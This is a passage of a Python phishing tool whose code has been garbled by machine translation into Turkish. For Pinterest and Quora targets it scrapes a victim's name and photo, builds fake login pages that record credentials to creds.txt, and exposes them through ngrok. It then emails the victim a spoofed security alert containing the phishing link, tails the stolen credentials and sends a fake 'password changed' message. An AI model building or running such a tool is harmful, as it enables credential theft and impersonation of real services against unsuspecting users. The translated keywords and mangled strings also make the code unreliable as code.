		zaman . uyku ( 6 )
		k  =  br . find_element_by_css_selector ( '._u3' )
		NAME  =  str ( br . Find_element_by_css_selector ( '._tf' ). Metin )
		PIC  =  str ( k . Get_attribute ( "src" ))
		br . kapat ()
		görüntüler . durdur ()
		
	hariç  özel durum  olarak  , e :
		yazdır ( "" + Gri + "[" + Kırmızı + "UNAME YOK" + Gri + "]" + Yeşil + ":" + Sıfırla )
		çıkış ( 0 )





	os . sistemi ( 'rm -r ./WEBSERVER/' )
	os . sistemi ( 'mkdir ./WEBSERVER' )

	filedata  =  str ( Main_pinterest )

	filedata  =  dosya verileri . değiştir ( '[PIC]' , PIC )
	filedata  =  dosya verileri . değiştir ( '[NAME]' , str ( NAME ))
	filedata  =  dosya verileri . değiştir ( '[UNAME]' , str ( UNAME ))
	filedata  =  dosya verileri . değiştir ( '[EMAIL]' , str ( E-posta ))

	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )



	filedata  =  str ( Mobile_pinterest )

	ile  açık ( './WEBSERVER/mobile.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )

	filedata  =  str ( Güvenli_görev )
	ile  açık ( './WEBSERVER/pass_changed.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( Login_pinterest )
	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )




	os . sistemi ( 'touch ./WEBSERVER/creds.txt' )



	os . sistemi ( 'chmod -R 777 ./WEBSERVER/' )
	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )
	zaman . uyku ( 3 )
	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()
	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )
	zaman . uyku ( 5 )
	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	görüntüler . durdur ()
	phishin_url  =  str ( url_f )


	emaildata  =  str ( Email_pinterest )
	emaildata  =  emaildata . değiştir ( '[NAME]' , str ( NAME ))
	emaildata  =  emaildata . değiştir ( '[OS]' , str ( osz ))
	emaildata  =  emaildata . değiştir ( '[LOC]' , str ( locz ))
	emaildata  =  emaildata . değiştir ( '[ PHISH ]' , str ( phishin_url ))

	from_email  =  str ( rastgele . seçim ([ 'security@pinterestmails.com' , 'no-reply@pinterestmails.com' ]))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Giriş yapmaya mı çalışıyorsunuz?' , '-m' , e-posta verileri , '-s' , smtps + ":" + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( 'reset' )
	banN ()

	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mAd üzerindeki Krediler için Dinleme: \ 033 [0; 94m" + str ( UNAME ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phishin_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( 'tail -f ./WEBSERVER/creds.txt' )

	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )
	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )

	print ( "Otomatik Olarak Bir Onay E-postası Gönderme !! \ n " )

	emaildata  =  str ( Confirm_pinterest )
	emaildata  =  emaildata . değiştir ( '[NAME]' , str ( NAME ))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'şifre değişti' , '-m' , e-posta verileri , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])
	os . sistemi ( "sıfırla" )
	ENDst ()


################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################



def  Quora ():


	UNAME  =  giriş ( "" + Gri + "[" + Mavi + "Kullanıcı adı" + Gri + "]" + Yeşil + ":" + Sıfırla )
	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )

	rndm  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak istiyorum Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )

	eğer  RNDM  ==  "N" :
		osz  =   giriş ( "" + Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )
		locz  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )
	elif  rndm  ==  "y" :
		locz  =  rastgele . seçim ([ 'Irak' , 'Mısır' , 'Rusya' ])
		osz  =  rastgele . seçim ([ 'Linux' ])	

	os . sistemi ( 'reset' )
	baskı ( Mavi + "" "________ ___ ___ ________ ________ ________" "" )
	yazdır ( Mavi + "" "| \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\    __   \\          " "" )
	yazdır ( Mavi + "" "          \\  \\   \\ | \\   \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\         "" " )
	yazdır ( Mavi + "" "           \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    _ _ \\  \\    __   \\        "" " )
	yazdır ( Mavi + "" "            \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\   \\ \\  \ \   \\  \\   \\       "" " )
	yazdır ( Mavi + "" "             \\  \\ _____   \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\ _ \\ \\  \\ __ \\  \\ __ \\      " "" )
	yazdır ( Mavi + "" "              \\ | ___ | \\ __ \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |" "" )
	yazdır ( Mavi + "" "                     \\ | __ |" "" )
	baskı ( Mavi + "" "" "" )
	baskı ( Mavi + "" "" "" )
	baskı ( Mavi + "" "___ ___ ________ ________ ___ __ ________" "" )
	yazdır ( Mavi + "" "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\     " "" )
	yazdır ( Mavi + "" "             \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | \\  \\   \\ | \\   \\    "" " )
	yazdır ( Mavi + "" "              \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\  \\    __   \\   " "" )
	yazdır ( Mavi + "" "               \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\  \\   \ \  \\   \\ "" " )
	yazdır ( Mavi + "" "                \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ __ \\  \\ __ \ \ "" " )
	yazdır ( Mavi + "" "                 \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |" "" )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )

	AD  =  ''
	EMAIL  =  ''

	url  =  "https://www.quora.com/profile/" + str ( UNAME )
	alt süreç . call ([ 'xterm' , '-e' , 'wget' , '-O' , 'cunt.html' , url ])
	file  =  open ( 'cunt.html' , 'r' ). oku ()	

	dene :
		NAME  = ( dosya . Bölme ( "'alt ='" )) [ 1 ]. bölünmüş ( "'height =' 200 'genişlik =' 200 '/> <span id ='" ) [ 0 ]
		PIC  = ( dosya . Bölünmüş ( "_link '> <img class =' ​​profile_photo_img 'src ='" )) [ 1 ]. bölünmüş ( "'alt ='" ) [ 0 ]

	 İstisna hariç :
		yazdır ( "Err0r, Yanlış UNAME" )
		os . sistemi ( 'rm cunt.html' )
		çıkış ( 0 )		

	os . sistemi ( 'rm cunt.html' )

	os . sistemi ( 'rm -r ./WEBSERVER/' )
	os . sistemi ( 'mkdir ./WEBSERVER' )

	filedata  =  str ( Main_Quora )

	filedata  =  dosya verileri . değiştir ( '[PIC]' , PIC )
	filedata  =  dosya verileri . değiştir ( '[EMAIL]' , str ( E-posta ))

	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )



	filedata  =  str ( Mobile_Quora )
	filedata  =  dosya verileri . değiştir ( '[EMAIL]' , str ( E-posta ))

	ile  açık ( './WEBSERVER/mobile.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )

	filedata  =  str ( Secured_Quora )
	ile  açık ( './WEBSERVER/pass_changed.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( Login_Quora )
	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( Login1_Quora )
	ile  açık ( './WEBSERVER/login1.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )



	os . sistemi ( 'touch ./WEBSERVER/creds.txt' )



	os . sistemi ( 'chmod -R 777 ./WEBSERVER/' )
	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )

	os . sistemi ( "./ngrok http 80> / dev / null &" )
	zaman . uyku ( 3 )
	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()
	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )
	zaman . uyku ( 5 )
	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	görüntüler . durdur ()
	phishin_url  =  str ( url_f )


	emaildata  =  str ( Email_Quora )
	emaildata  =  emaildata . değiştir ( '[NAME]' , str ( NAME ))
	emaildata  =  emaildata . değiştir ( '[OS]' , str ( osz ))
	emaildata  =  emaildata . değiştir ( '[LOC]' , str ( locz ))
	emaildata  =  emaildata . değiştir ( '[ PHISH ]' , str ( phishin_url ))

	from_email  =  str ( rastgele . seçim ([ 'security@quoramails.com' , 'no-reply@quoramails.com' ]))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Giriş yapmaya mı çalışıyorsunuz?' , '-m' , e-posta verileri , '-s' , smtps + ":" + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( 'reset' )
	banN ()

	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mAd üzerindeki Krediler için Dinleme: \ 033 [0; 94m" + str ( UNAME ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phishin_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( 'tail -f ./WEBSERVER/creds.txt' )

	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )
	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )

	print ( "Otomatik Olarak Bir Onay E-postası Gönderme !! \ n " )

	emaildata  =  str ( Email1_Quora )
	emaildata  =  emaildata . değiştir ( '[NAME]' , str ( NAME ))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'şifre değişti' , '-m' , e-posta verileri , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])
	os . sistemi ( "sıfırla" )
	ENDst ()

################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################













def  banN ():
	yazdır ( "" " \ 033 [01; 32m \ n                                  \ 033 [1; 31m. :: ^ ;., \ n                                      \ 033 [1; 31m:; i: i \ n                                     \ 033 [1; 31m :: i :; i \ n                               \ 033 [1; 31m .. :: i:;: i:; i \ n                              \ 033 [1; 31m, i: i :::::: i \ n                                  \ 033 [1; 31m ;; :: ;;: ;; \ n                                  \ 033 [1; 34m: \ 033 [01; 32mo    \ 033 [01; 32mo \ 033 [1; 34m: \ n                                  \ 033 [1; 34m ;.   \ 033 [ 01; 32mn   \ 033 [1; 34m .; \ n                                    \ 033 [1; 34m ( \ 033 [01; 32mx\ 033 [1; 34m) \ n                                     \ 033 [1; 34m ^^^ \ n                                  \ 033 [1; 30m- [ \ 033 [0m @ _DEF9 \ 033 [1; 30m] \ 033 [0m \ n "" " )






def  ENDst ():
	os . sistemi ( 'temiz' )
	baskı ( Yeşil + "" " \ n         . '() \\ .---.) \\ .---. / (, -.) \\ .--.) \\ .---.) \ \ .-. "" " )
	baskı ( Yeşil + "" ", ') \\   ) (, -._ ((, -._ (,' _) (._. '(, -._ (,', -, _)" "" )
	baskı ( Yeşil + "" "(/ (/ /    \\   '-,     \\   ' -, ('-' (` -.`.     \\   '-, (. _ "" " )
	baskı ( Yeşil + "" ") (), -`), -`) _), _ (   \\     ), -`) '..')" "" )
	baskı ( Yeşil + "" "(. ' \\  \\    (` `-. (` `-. (' - '/ ('.))) (` `-. (, (" "" )
	baskı ( Yeşil + "" ") /) /) ..-. () ..-. () /._. ' '._ _.' ) ..-. () /'._. ' "" " )
	baskı ( Yeşil + "" "" "" )
	yazdır ( "" + Gri + "[" + Yeşil + "+" + Gri + "]" + Sıfırla + "BİZİ TAKİP EDİN:" + Gri + "[" + Yeşil + "+" + Gri + "] \ n " )
	yazdır ( Gri + "[" + Yeşil + "!" + Gri + "] - [" + Yeşil + "GITHUB" + Gri + "]:" + Sıfırla + "https://goo.gl/ooZC6H" )
	baskı ( Gri + "[" + Yeşil + "!" + Gri + "] - [" + Yeşil + "TWITTER" + Gri + "]:" + Sıfırla + "https://goo.gl/b1w5x1" )
	yazdır ( Gri + "[" + Yeşil + "!" + Gri + "] - [" + Yeşil + "YOUTUBE" + Gri + "]:" + Sıfırla + "https://goo.gl/YcqyuQ" )
	baskı ( Gri + "[" + Yeşil + "+" + Gri + "] - [" + Yeşil + "Z-HACKER" + Gri + "]:" + Sıfırla + "https://goo.gl/eHQMXC \ n " )
	yazdır ( '' + Sıfırla + '-' + Gri + 'Stay Weeb' + Sıfırla + '- \ n ' )
	sys . çıkış ( 0 )



eğer  __name__  ==  "__main__" :
	dene :
		Menü ()
	 KeyboardInterrupt hariç :
		ENDst ()
